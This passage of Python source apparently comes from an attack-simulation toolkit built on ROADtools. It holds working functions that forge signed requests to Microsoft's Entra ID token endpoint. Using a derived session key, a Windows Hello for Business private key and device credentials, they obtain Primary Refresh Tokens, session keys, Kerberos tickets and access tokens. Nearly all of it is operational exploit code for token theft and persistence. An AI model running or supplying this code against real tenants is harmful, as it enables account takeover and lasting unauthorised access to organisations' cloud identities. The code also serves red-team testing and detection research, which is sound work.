		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	# Step 2: Request nonce from srv_challenge
	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
	}

	try:
		nonce_response = requests.post(nonce_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			return

		nonce = nonce_response.json().get("Nonce")
		if not nonce:
			logging.error("No nonce received")
			return

	except Exception as e:
		logging.error(f"Exception during nonce request: {e}")
		return

	# Step 3: Create JWT payload signed with derived key
	now = int(time.time())
	jwt_payload = {
		"client_id": client_id,
		"request_nonce": nonce,
		"scope": scope,
		"grant_type": "refresh_token",
		"refresh_token": prt,
		"win_ver": "10.0.19041.868",
		"aud": token_endpoint,
		"iss": "29d9ed98-a469-4536-ade2-f981bc1d605e",
		"iat": now,
		"exp": now + 3600,
	}
	if redirect_uri:
		jwt_payload["redirect_uri"] = redirect_uri

	# Create temp JWT to extract body for KDF
	jwt_context = os.urandom(24)
	headers_for_temp = {
		'ctx': base64.b64encode(jwt_context).decode('utf-8'),
		'kdf_ver': 2
	}

	try:
		temp_jwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=headers_for_temp)
		jbody = temp_jwt.split('.')[1]
		jwtbody = base64.urlsafe_b64decode(jbody + ('=' * (len(jbody) % 4)))

		derived_key = _calculate_derived_key_v2(session_key, jwt_context, jwtbody)
		request_jwt = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=headers_for_temp)

	except Exception as e:
		logging.error(f"Failed to create/sign JWT: {e}")
		return

	# Step 4: Submit signed JWT to token endpoint
	token_body = {
		'prt_protocol_version': '3.0',
		'grant_type': 'urn:ietf:params:oauth:grant-type:jwt-bearer',
		'request': request_jwt,
		'client_info': '1'
	}

	try:
		token_response = requests.post(token_endpoint, headers=headers, data=token_body, timeout=10)

		if token_response.status_code not in (200, 201):
			logging.error(f"Token request failed: {token_response.status_code}")
			try:
				error_data = token_response.json()
				logging.error(f"Error: {error_data.get('error')}")
				logging.error(f"Description: {error_data.get('error_description')}")
			except:
				logging.error(f"Response: {token_response.text[:200]}")
			return

		# Step 5: Decrypt response using session key
		plaintext = _decrypt_response_with_derived_key(token_response.text, session_key)
		if not plaintext:
			logging.error("Failed to decrypt response")
			return

		# Step 6: Parse decrypted response and extract tokens
		try:
			response_data = json.loads(plaintext)
		except Exception as e:
			logging.error(f"Failed to parse decrypted response as JSON: {e}")
			return

		# Extract tokens from response
		output = {
			"status": " Token request successful",
			"client_id": client_id,
			"scope": scope,
			"response_keys": list(response_data.keys()),
		}

		# Extract access token
		if 'access_token' in response_data:
			output["access_token"] = response_data['access_token']
			logging.info(f" ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")

		for key in ['refresh_token', 'id_token', 'expires_in']:
			if key in response_data:
				output[key] = response_data[key]

		return output

	except Exception as e:
		logging.error(f"Exception during token request: {e}")
		return


def get_prt_with_whfb_key(params):
	"""
	Acquire a Primary Refresh Token (PRT) using a registered Windows Hello for Business key.

	Uses the Windows Hello for Business private key (registered in create_whfb_key) to create
	an assertion, which is then used to authenticate and obtain a PRT from Entra ID.

	Based on ROADtools get_prt_with_hello_key and create_hello_prt_assertion:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L242

	Parameters:
		whfb_key_path: Path to saved Windows Hello private key file
		key_path: Path to device private key (for signing token request)
		cert_path: Path to device certificate (for token request headers)
		username: Username for JWT assertion (typically user@domain)
		tenant_id: Tenant ID

	Returns:
		Dictionary with PRT and session key details
	"""
	logging.info("Running the get_prt_with_whfb_key technique")

	# Load parameters
	whfb_key_path = _artifact_read_path(params, params.get("whfb_key_path"))
	key_path = _artifact_read_path(params, params.get("key_path"))
	cert_path = _artifact_read_path(params, params.get("cert_path"))
	username = params.get("username")
	tenant_id = params.get("tenant_id", "common")

	if not all([whfb_key_path, key_path, cert_path, username]):
		logging.error("whfb_key_path, key_path, cert_path, and username parameters are required")
		return

	# Step 1: Load Windows Hello for Business private key
	logging.debug("Step 1: Loading Windows Hello for Business private key")
	try:
		with open(whfb_key_path, "rb") as f:
			whfb_key_pem = f.read()
		whfb_key = serialization.load_pem_private_key(
			whfb_key_pem,
			password=None,
			backend=default_backend()
		)
		logging.debug("   Loaded Windows Hello private key")
	except Exception as e:
		logging.error(f"Failed to load Windows Hello key: {e}")
		return

	# Step 2: Load device private key and certificate
	logging.debug("Step 2: Loading device private key and certificate")
	try:
		with open(key_path, "rb") as f:
			device_key_pem = f.read()
		device_key = serialization.load_pem_private_key(
			device_key_pem,
			password=None,
			backend=default_backend()
		)

		with open(cert_path, "rb") as f:
			cert_data = f.read()
		try:
			device_cert = x509.load_der_x509_certificate(cert_data, default_backend())
		except:
			logging.warning("Failed to parse device certificate with cryptography, will use binary data")
			device_cert = None

		logging.debug("   Loaded device key and certificate")
	except Exception as e:
		logging.error(f"Failed to load device credentials: {e}")
		return

	# Step 3: Calculate Windows Hello key ID (kid)
	logging.debug("Step 3: Calculating Windows Hello key identifier")
	try:
		whfb_key_blob = _build_transport_key_blob(whfb_key.public_key())
		whfb_key_blob_bytes = base64.b64decode(whfb_key_blob)
		kid_hash = hashes.Hash(hashes.SHA256(), backend=default_backend())
		kid_hash.update(whfb_key_blob_bytes)
		kid = base64.b64encode(kid_hash.finalize()).decode('utf-8')
		logging.debug(f"   Calculated Windows Hello kid: {kid[:20]}...")
	except Exception as e:
		logging.error(f"Failed to calculate key ID: {e}")
		return

	# Step 4: Request nonce for Windows Hello assertion
	logging.debug("Step 4: Requesting nonce for Windows Hello assertion (srv_challenge)")
	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",  # Windows Hello client ID
	}

	try:
		nonce_response = requests.post(token_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error("No nonce received from srv_challenge")
			return

		logging.debug(f"   Obtained nonce: {nonce[:20]}...")
	except Exception as e:
		logging.error(f"Exception during nonce request: {e}")
		return

	# Step 5: Create Windows Hello PRT assertion (signed with WHfB key)
	logging.debug("Step 5: Creating Windows Hello assertion (JWT signed with WHfB key)")
	try:
		now = int(time.time())
		assertion_payload = {
			"iss": username,
			"aud": "common",
			"iat": now - 3600,
			"exp": now + 3600,
			"request_nonce": nonce,
			"scope": "openid aza ugs"
		}

		assertion_headers = {
			"kid": kid,
			"use": "ngc"
		}

		whfb_assertion = jwt.encode(
			assertion_payload,
			whfb_key,
			algorithm="RS256",
			headers=assertion_headers
		)

		logging.debug(f"   Created Windows Hello assertion: {whfb_assertion[:60]}...")
	except Exception as e:
		logging.error(f"Failed to create assertion: {e}")
		return

	# Step 6: Request challenge nonce for device cert signing
	logging.debug("Step 6: Requesting challenge nonce for device certificate signing")
	challenge_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
	}

	try:
		challenge_response = requests.post(token_endpoint, headers=headers, data=challenge_body, timeout=10)
		if challenge_response.status_code != 200:
			logging.error(f"Challenge request failed: {challenge_response.status_code}")
			return

		challenge_data = challenge_response.json()
		challenge = challenge_data.get("Nonce")
		if not challenge:
			logging.error("No challenge nonce received")
			return

		logging.debug(f"   Obtained challenge: {challenge[:20]}...")
	except Exception as e:
		logging.error(f"Exception during challenge request: {e}")
		return

	# Step 7: Create token request payload and sign with device certificate
	logging.debug("Step 7: Creating token request signed with device certificate")
	try:
		# Build request payload
		request_payload = {
			"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
			"request_nonce": challenge,
			"scope": "openid aza ugs",
			"group_sids": [],
			"win_ver": "10.0.19041.868",
			"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
			"username": username,
			"assertion": whfb_assertion
		}

		# Encode cert for x5c header
		cert_der = base64.b64encode(cert_data).decode('utf-8')

		# Create JWT signed with device certificate
		token_headers = {
			"x5c": cert_der,
			"kdf_ver": 2
		}

		request_jwt = jwt.encode(
			request_payload,
			device_key,
			algorithm="RS256",
			headers=token_headers
		)

		logging.debug(f"   Created signed token request: {request_jwt[:60]}...")
	except Exception as e:
		logging.error(f"Failed to create signed request: {e}")
		return

	# Step 8: Submit token request to obtain PRT
	logging.debug("Step 8: Submitting token request to obtain PRT")
	prt_body = {
		"windows_api_version": "2.2",
		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
		"request": request_jwt,
		"client_info": "1",
		"tgt": True,
	}

	try:
		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
	except Exception as e:
		logging.error(f"Exception during PRT request: {e}")
		return

	if prt_response.status_code not in (200, 201):
		logging.error(f"PRT request failed: {prt_response.status_code}")
		try:
			error_response = prt_response.json()
			logging.error(f"Error: {error_response.get('error')}")
			logging.error(f"Error description: {error_response.get('error_description')}")
		except:
			logging.error(f"Response: {prt_response.text[:200]}")
		return

	try:
		result = prt_response.json()
	except Exception as e:
		logging.error(f"Failed to parse PRT response: {e}")
		return

	# Step 9: Decrypt and save PRT components
	logging.debug("Step 9: Decrypting session key and saving PRT components")
	session_key_jwe = result.get("session_key_jwe")
	tgt_ad = result.get("tgt_ad")
	tgt_cloud = result.get("tgt_cloud")
	refresh_token = result.get("refresh_token")

	if not session_key_jwe:
		logging.error("PRT response did not include session_key_jwe")
		return

	# Decrypt session_key_jwe to get the actual session key for later use
	# Note: session_key_jwe is encrypted to the device certificate's public key, not the WHfB key
	try:
		session_key = _decrypt_jwe_with_private_key(session_key_jwe, device_key)
		if not session_key:
			logging.error("Failed to decrypt session key from PRT response")
			return
		logging.debug("   Session key decrypted and ready for storage")
	except Exception as e:
		logging.error(f"Failed to decrypt session key: {e}")
		return

	output = {
		"device_id": username,
		"session_key": base64.b64encode(session_key).decode('utf-8'),
		"tgt_ad": tgt_ad,
		"tgt_cloud": tgt_cloud,
		"refresh_token": refresh_token,
		"id_token": result.get("id_token"),
		"obtained_at": datetime.utcnow().isoformat(),
		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
		"authentication_method": "Windows Hello for Business"
	}

	logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
	return output


def get_prt_with_whfb_key_v2(params):
	"""
	Acquire a Primary Refresh Token (PRT) using a registered Windows Hello for Business key.

	v2.0 counterpart of get_prt_with_whfb_key: hits ``/oauth2/v2.0/token`` and
	the signed request carries ``prt_protocol_version=3.0`` instead of
	``windows_api_version``. Under the hood this is ROADtools' PRT protocol v3
	(get_prt_with_hello_key_v3).

	Uses the Windows Hello for Business private key (registered in create_whfb_key) to create
	an assertion, which is then used to authenticate and obtain a PRT from Entra ID.

	Based on ROADtools get_prt_with_hello_key and create_hello_prt_assertion:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L242

	Parameters:
		whfb_key_path: Path to saved Windows Hello private key file
		key_path: Path to device private key (for signing token request)
		cert_path: Path to device certificate (for token request headers)
		username: Username for JWT assertion (typically user@domain)
		tenant_id: Tenant ID

	Returns:
		Dictionary with PRT and session key details
	"""
	logging.info("Running the get_prt_with_whfb_key_v2 technique")

	# Load parameters
	whfb_key_path = _artifact_read_path(params, params.get("whfb_key_path"))
	key_path = _artifact_read_path(params, params.get("key_path"))
	cert_path = _artifact_read_path(params, params.get("cert_path"))
	username = params.get("username")
	tenant_id = params.get("tenant_id", "common")

	if not all([whfb_key_path, key_path, cert_path, username]):
		logging.error("whfb_key_path, key_path, cert_path, and username parameters are required")
		return

	# Step 1: Load Windows Hello for Business private key
	logging.debug("Step 1: Loading Windows Hello for Business private key")
	try:
		with open(whfb_key_path, "rb") as f:
			whfb_key_pem = f.read()
		whfb_key = serialization.load_pem_private_key(
			whfb_key_pem,
			password=None,
			backend=default_backend()
		)
		logging.debug("   Loaded Windows Hello private key")
	except Exception as e:
		logging.error(f"Failed to load Windows Hello key: {e}")
		return

	# Step 2: Load device private key and certificate
	logging.debug("Step 2: Loading device private key and certificate")
	try:
		with open(key_path, "rb") as f:
			device_key_pem = f.read()
		device_key = serialization.load_pem_private_key(
			device_key_pem,
			password=None,
			backend=default_backend()
		)

		with open(cert_path, "rb") as f:
			cert_data = f.read()
		try:
			device_cert = x509.load_der_x509_certificate(cert_data, default_backend())
		except:
			logging.warning("Failed to parse device certificate with cryptography, will use binary data")
			device_cert = None

		logging.debug("   Loaded device key and certificate")
	except Exception as e:
		logging.error(f"Failed to load device credentials: {e}")
		return

	# Step 3: Calculate Windows Hello key ID (kid)
	logging.debug("Step 3: Calculating Windows Hello key identifier")
	try:
		whfb_key_blob = _build_transport_key_blob(whfb_key.public_key())
		whfb_key_blob_bytes = base64.b64decode(whfb_key_blob)
		kid_hash = hashes.Hash(hashes.SHA256(), backend=default_backend())
		kid_hash.update(whfb_key_blob_bytes)
		kid = base64.b64encode(kid_hash.finalize()).decode('utf-8')
		logging.debug(f"   Calculated Windows Hello kid: {kid[:20]}...")
	except Exception as e:
		logging.error(f"Failed to calculate key ID: {e}")
		return

	# Step 4: Request nonce for Windows Hello assertion
	logging.debug("Step 4: Requesting nonce for Windows Hello assertion (srv_challenge)")
	nonce_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",  # Windows Hello client ID
	}

	try:
		nonce_response = requests.post(nonce_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error("No nonce received from srv_challenge")
			return

		logging.debug(f"   Obtained nonce: {nonce[:20]}...")
	except Exception as e:
		logging.error(f"Exception during nonce request: {e}")
		return

	# Step 5: Create Windows Hello PRT assertion (signed with WHfB key)
	logging.debug("Step 5: Creating Windows Hello assertion (JWT signed with WHfB key)")
	try:
		now = int(time.time())
		assertion_payload = {
			"iss": username,
			"aud": "common",
			"iat": now - 3600,
			"exp": now + 3600,
			"request_nonce": nonce,
			"scope": "openid aza ugs"
		}

		assertion_headers = {
			"kid": kid,
			"use": "ngc"
		}

		whfb_assertion = jwt.encode(
			assertion_payload,
			whfb_key,
			algorithm="RS256",
			headers=assertion_headers
		)

		logging.debug(f"   Created Windows Hello assertion: {whfb_assertion[:60]}...")
	except Exception as e:
		logging.error(f"Failed to create assertion: {e}")
		return

	# Step 6: Request challenge nonce for device cert signing
	logging.debug("Step 6: Requesting challenge nonce for device certificate signing")
	challenge_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
	}

	try:
		challenge_response = requests.post(nonce_endpoint, headers=headers, data=challenge_body, timeout=10)
		if challenge_response.status_code != 200:
			logging.error(f"Challenge request failed: {challenge_response.status_code}")
			return

		challenge_data = challenge_response.json()
		challenge = challenge_data.get("Nonce")
		if not challenge:
			logging.error("No challenge nonce received")
			return

		logging.debug(f"   Obtained challenge: {challenge[:20]}...")
	except Exception as e:
		logging.error(f"Exception during challenge request: {e}")
		return

	# Step 7: Create token request payload and sign with device certificate
	logging.debug("Step 7: Creating token request signed with device certificate")
	try:
		# Build request payload per ROADtools get_prt_with_hello_key_v3
		request_payload = {
			"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
			"request_nonce": challenge,
			"scope": "openid aza offline_access",
			"group_sids": [],
			"win_ver": "10.0.19041.868",
			"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
			"username": username,
			"assertion": whfb_assertion
		}

		# Encode cert for x5c header
		cert_der = base64.b64encode(cert_data).decode('utf-8')

		# Create JWT signed with device certificate. The v3 flow drops the
		# kdf_ver header the v1 flow sends.
		token_headers = {
			"x5c": cert_der,
		}

		request_jwt = jwt.encode(
			request_payload,
			device_key,
			algorithm="RS256",
			headers=token_headers
		)

		logging.debug(f"   Created signed token request: {request_jwt[:60]}...")
	except Exception as e:
		logging.error(f"Failed to create signed request: {e}")
		return

	# Step 8: Submit token request to obtain PRT
	logging.debug("Step 8: Submitting token request to obtain PRT")
	prt_body = {
		"prt_protocol_version": "3.0",
		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
		"request": request_jwt,
		"client_info": "1",
	}

	try:
		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
	except Exception as e:
		logging.error(f"Exception during PRT request: {e}")
		return

	if prt_response.status_code not in (200, 201):
		logging.error(f"PRT request failed: {prt_response.status_code}")
		try:
			error_response = prt_response.json()
			logging.error(f"Error: {error_response.get('error')}")
			logging.error(f"Error description: {error_response.get('error_description')}")
		except:
			logging.error(f"Response: {prt_response.text[:200]}")
		return

	try:
		result = prt_response.json()
	except Exception as e:
		logging.error(f"Failed to parse PRT response: {e}")
		return

	# Step 9: Decrypt and save PRT components
	logging.debug("Step 9: Decrypting session key and saving PRT components")
	session_key_jwe = result.get("session_key_jwe")
	tgt_ad = result.get("tgt_ad")
	tgt_cloud = result.get("tgt_cloud")
	refresh_token = result.get("refresh_token")

	if not session_key_jwe:
		logging.error("PRT response did not include session_key_jwe")
		return

	# Decrypt session_key_jwe to get the actual session key for later use
	# Note: session_key_jwe is encrypted to the device certificate's public key, not the WHfB key
	try:
		session_key = _decrypt_jwe_with_private_key(session_key_jwe, device_key)
		if not session_key:
			logging.error("Failed to decrypt session key from PRT response")
			return
		logging.debug("   Session key decrypted and ready for storage")
	except Exception as e:
		logging.error(f"Failed to decrypt session key: {e}")
		return

	output = {
		"device_id": username,
		"session_key": base64.b64encode(session_key).decode('utf-8'),
		"tgt_ad": tgt_ad,
		"tgt_cloud": tgt_cloud,
		"refresh_token": refresh_token,
		"id_token": result.get("id_token"),
		"obtained_at": datetime.utcnow().isoformat(),
		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
		"authentication_method": "Windows Hello for Business"
	}

	logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
	return output
